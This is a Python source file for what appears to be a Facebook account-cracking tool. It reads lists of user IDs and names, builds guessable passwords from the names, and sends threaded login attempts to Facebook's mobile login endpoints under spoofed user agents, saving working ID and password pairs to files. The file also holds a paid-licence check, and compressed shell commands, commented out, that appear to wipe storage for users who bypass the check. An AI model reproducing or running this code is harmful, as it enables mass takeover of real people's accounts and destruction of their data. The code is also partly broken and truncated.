#SPY(SAT SHAHIN YT)(SHAHI. ALAM)
#WhatsApp : 01615161056
#Github : SPY1x1
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	useragent.append(uakua)

def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "→".join(uuid)
  server = requests.get(f'{tan}://{iya}.com/{ani}122/vip/blob/main/a.txt').text
  
 

  os.system(f" clear")                          
  print(f"""\x1b[1;97m
d8b   db  .d88b.   .d88b.  d8888b. 
888o  88 .8P  Y8. .8P  Y8. 88  `8D \033[1;33m𝗡\033[1;37m
88V8o 88 88    88 88    88 88oooY' \033[1;34m𝗢\033[1;37m
88 V8o88 88    88 88    88 88~~~b. \033[1;35m𝗢\033[1;37m
88  V888 `8b  d8' `8b  d8' 88   8D \033[1;36m𝗕\033[1;37m
VP   V8P  `Y88P'   `Y88P'  Y8888P'

  \033[1;32m┌──────────────────────────────────────────────┐
\033[1;32m │\33[37;41m\t     AXLONE FILE CLONING VERSION   \33[0;m  │
 \033[1;32m└──────────────────────────────────────────────┘
 
 \033[1;32m┌────────────────────────────────────────────────┐
 \033[1;32m│\033[1;31m➣\033[1;91m DEVELOPMENT     \033[1;31m:\033[1;32m AXLONE
 \033[1;32m│\033[1;31m➣\033[1;32m FACEBOOK        \033[1;31m:\033[1;32m Dickoun
 \033[1;32m│\033[1;31m➣\033[1;91m WHATSAPP        \033[1;31m:\033[1;32m [+9351611490]
 \033[1;32m│\033[1;31m➣\033[1;32m GITHUB          \033[1;31m:\033[1;32m porn.com
 \033[1;32m└────────────────────────────────────────────────┘\n""")                                          
  print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
  print(f"")
  print(f" \033[1;32m  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
  print(f"")
  print(f"\x1b[1;92m   contract Admin to Buy this Tools                                                               ");time.sleep (0.1) 
  print(f"")
  print(f"\033[1;32     YOUR  KEY : "+id)
  print(f"")
  print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
  print(f"")
  print(f"  Follow Admin Facebook ID,,,,,,,,,,,,,,,,,    ");time.sleep(1)
  os.system(f'xdg-open {tan}://www.facebook.com/sat.shahinyt')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get(f"{tan}://{iya}.com/{ani}122/vip/blob/main/a.txt").text
    if id in httpCaht:
      print(f"\033[1;92m   YOUR KEY APROVED  ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print(f"\x1b[1;92m    Sorry Bro Your Key not Aproved ")
      print(f"    Send payment to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open {tan}://wa.me/+09351611490?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	menu_apikey()
#menu_apikey()
logo= """  \033[1;92m
\033[1;92m╔═════════════════╗
\033[1;93m FREEE LANG TO INANYU\033[1;32m
\033[1;92m═══════════════════
\033[1;92m══════════════════════════════════════════
\033[1;32m██████╗ ██████╗  █████╗ ███╗  ██╗██████╗ 
\033[1;32m██╔══██╗██╔══██╗██╔══██╗████╗ ██║██╔══██╗
\033[1;32m██████╦╝██████╔╝███████║██╔██╗██║██║  ██║
\033[1;32m██╔══██╗██╔══██╗██╔══██║██║╚████║██║  ██║
\033[1;32m██████╦╝██║  ██║██║  ██║██║ ╚███║██████╔╝
\033[1;32m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝╚═════╝    AXELONE
\033[1;92m══════════════════════════════════════════       
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m FREE
\033[1;32m[-] VERSION   :\033[1;32m 1.0
\033[1;32m[-] AUTHOR    :\033[1;32m SYMPRE SI TROY
\033[1;32m[-] GITHUB    :\033[1;32m JOJOKE
\033[1;32m[-] FACEBOOK  :\033[1;32m TROY KUGISAKI
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS AXELONE BRAND\033[;0m\033[1;91m═══>\033[1;92m"""

def linex():
        print(50*'_')
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def fucked():
	print(' Server Loadin.......')
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	print(' Fuck You Bypass User ');exit()

def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "→".join(uuid)
	server = requests.get(f'{tan}://{iya}.com/{ani}122/vip/blob/main/a.txt').text
	try:
		httpCaht = requests.get(f"{tan}://{iya}.com/{ani}122/vip/blob/main/b.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
			pass
		else:
			msg = str(os.geteuid())
			fucked()
	except:
			sys.exit()
def Spy():
	clear()
	#ckx()
	print(f" [1] FILE Cloner (BEST) ")
	print(f" [2] BD Random Cloner ")
	print(f" [3] Gmail Cloning")
	print(f" [0] Exit")
	me=input(f' Choice : ')
	if me in ["2", "02"]:
		bd()
	if me in ["3","03"]:
		gml()
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' Put file path\033[1;37m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' File location not found ')
			exit()
		print(f' [1] Method 1 \n [2] Method 2 \n [3] Method 3 \n [4] Method 4 \n [5] Method 5 \n [6] Method 6 \n [7] Method 7 \n [8] Method 8')
		mthd=input(f' Choose: ')
		plist=[]
		try:
			ps_limit = int(input(f' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		print(f'\033[1;32m exp: first last,firtslast,first123')
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
		print(f' Do you went show cp account? (y/n): ')
		cx=input(f' Choose: ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f' Total account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod > \033[1;37mM{mthd}')
			print(f"\033[1;37m Use flight mode for speed up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(api,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(ffb1,ids,names,passlist)
				elif mthd in ['4','04']:
					crack_submit.submit(api1,ids,names,passlist)
				elif mthd in ['5','05']:
					crack_submit.submit(ffb3,ids,names,passlist)
				elif mthd in ['6','06']:
					crack_submit.submit(ffb4,ids,names,passlist)
				elif mthd in ['7','07']:
					crack_submit.submit(ffb7,ids,names,passlist)
				elif mthd in ['8','08']:
					crack_submit.submit(ffb8,ids,names,passlist)
				else:
					crack_submit.submit(api1,ids,names,passlist)
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [AXE] %s|\033[1;32mSuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [Success] %s | %s'%(ids,pas))
                                open(f'/sdcard/Success.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
#
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [AXE] %s|\033[1;32mSuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [Success] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                open(f'/sdcard/Success.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def ffb3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [AXE %s|\033[1;32mSuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
